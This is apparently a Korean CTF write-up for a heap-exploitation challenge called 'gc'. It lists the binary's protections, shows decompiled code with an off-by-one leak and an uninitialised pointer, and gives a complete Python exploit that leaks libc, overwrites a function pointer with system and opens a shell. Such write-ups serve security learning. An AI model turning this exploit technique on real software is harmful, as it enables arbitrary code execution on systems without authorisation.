GC (Solver : 6)
=============

### 1. Introduction

| RELRO    | STACK CANARY    | NX         | PIE         | RPATH    | RUNPATH    | FILE |
|----------|-----------------|------------|-------------|----------|------------|------|
| No RELRO | No canary found | NX enabled | PIE enabled | No RPATH | No RUNPATH | gc   | 

이런 포너블을 많이 풀어야 실력이 늘듯하다.

### 2. Vulnerability
- Box에 달린 tag를 출력할 때 설정한 크기보다 1바이트 더 출력한다.

```c
  else
    v1 = *((i & 0xFFFFFFFFFFFFFFFCLL) + 16);
  v1(v2, box->tag_string, box->tag_len, 0LL);
  if ( *(i & 0xFFFFFFFFFFFFFFFCLL) == i )
  {
    work_line = 0LL;
  }
  else
  {                                             // Workline is not initialize.
    *(*((i & 0xFFFFFFFFFFFFFFFCLL) + 8) & 0xFFFFFFFFFFFFFFFCLL) = *(i & 0xFFFFFFFFFFFFFFFCLL);// *(*(i + 8)) = *(i)
    *((*(i & 0xFFFFFFFFFFFFFFFCLL) & 0xFFFFFFFFFFFFFFFCLL) + 8) = *((i & 0xFFFFFFFFFFFFFFFCLL) + 8);//  *(*(i) + 8) = *(i + 8)
  }
  if ( storage_list )
  {
```
- store하려는 i(box)에 있는 주소가 i와 같지 않다면 else문으로 가서 work_line을 초기화하지 않는다.

### Exploit
copy gc를 이용하여 memory leak을 할 수 있는데, 그 이유는 gc를 하는 과정에서 메모리를 초기화하지 않기 때문이다. 그래서 바로 leak을 할 수 있고, exploit의 경우
work_line을 초기화하지 않는것을 이용하여 work_line과 storage를 같은 메모리를 가르키게 만들고 storage가 구조체에서 함수를 호출하는것을 이용하여 exploit하면 된다.

```python
from ntpwn import *

s = process('./gc')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# local
b = BP(s)
b.bp('tracemalloc on')
#b.bpie64(0x12f0) # egg alloc
#b.bpie64(0x15a0) # box_alloc
#b.bpie64(0x1469) # box_alloc -> egg
#b.bpie64(0x21a0) # gc-fun1
#b.bpie64(0x1dc0) # gc
#b.bpie64(0x1001) # print_storage
#b.bp('b *system')
b.bp('c')
b.done()

def getegg():
	s.sendlineafter('Command:\n','1')

def box(size):
	s.sendlineafter('Command:\n','2')
	s.sendlineafter(':\n',size)

def storebox():
	s.sendlineafter('Command:\n','3')

def storetag(length,string):
	s.sendlineafter('Command:\n','3')
	s.sendlineafter('length:\n',length)
	s.sendlineafter('string:\n',string)

def getbox(idx):
	s.sendlineafter('Command:\n','4')
	s.sendlineafter(':\n',idx)

def deliver(idx):
	s.sendlineafter('Command:\n','5')
	s.sendlineafter(':\n',idx)

def viewlist():
	s.sendlineafter('Command:\n','6')

def settag(length,string):
	s.sendlineafter('Command:\n','6')
	s.sendlineafter('length:\n',length)
	s.sendlineafter('string:\n',string)

libc = ''
for i in range(6):
	for j in range(3):
		getegg()

	box('3')
	storetag(str(0x300),'A')
	deliver('0')

	box('0')
	storetag(str(0x100000 - 0x40),'A')
	deliver('0')

	box('0')
	storetag(str(8),'A' * i)
	deliver('0')
	s.recvuntil('$>' + 'A' * i)
	libc += s.recv(1)

mmap = u64(libc + "\x00" * 2)
libc_base = mmap - 14106675
system = libc_base + l.symbols['system']
log.info("MMAP LEAK : " + hex(mmap))
log.info("LIBC_BASE LEAK : " + hex(libc_base))

# padding
payload = p64(0) * 15 + p64(system) + p64((1 << 64) - 0x20)
box('0')
storetag(str(0x100000 - 0x40),'A')
deliver('0')
box('0')
storetag(str(0x100000 - 0x40),payload)
deliver('0')

# overwrite
box(str(131072-10))
getegg()
box(str(0))
storetag(str(0x18),'/bin/sh\x00'.ljust(0x18,'A'))
deliver('0')
storetag('1','A')

getegg()
viewlist()
s.recvuntil('65):')


s.interactive()
```



